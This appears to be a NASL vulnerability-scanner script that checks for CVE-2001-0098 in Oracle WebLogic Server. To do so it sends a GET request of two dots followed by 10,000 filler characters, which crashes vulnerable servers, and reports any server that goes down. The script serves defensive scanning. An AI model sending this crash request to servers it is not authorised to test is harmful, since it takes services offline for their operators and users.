# SPDX-FileCopyrightText: 2001 StrongHoldNet
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:oracle:weblogic_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10697");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2138");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2001-0098");

  script_name("WebLogic Server DoS");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2001 StrongHoldNet");
  script_family("Web Servers");
  script_dependencies("gb_oracle_weblogic_consolidation.nasl");
  script_mandatory_keys("oracle/weblogic/detected");

  script_tag(name:"solution", value:"Upgrade to at least WebLogic 5.1 with Service Pack 7.");

  script_tag(name:"summary", value:"Requesting an overly long URL starting with a double dot
  can crash certain version of WebLogic servers.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if(!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

req = http_get(item:string("..", crap(10000)), port:port);
send(socket:soc, data:req);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
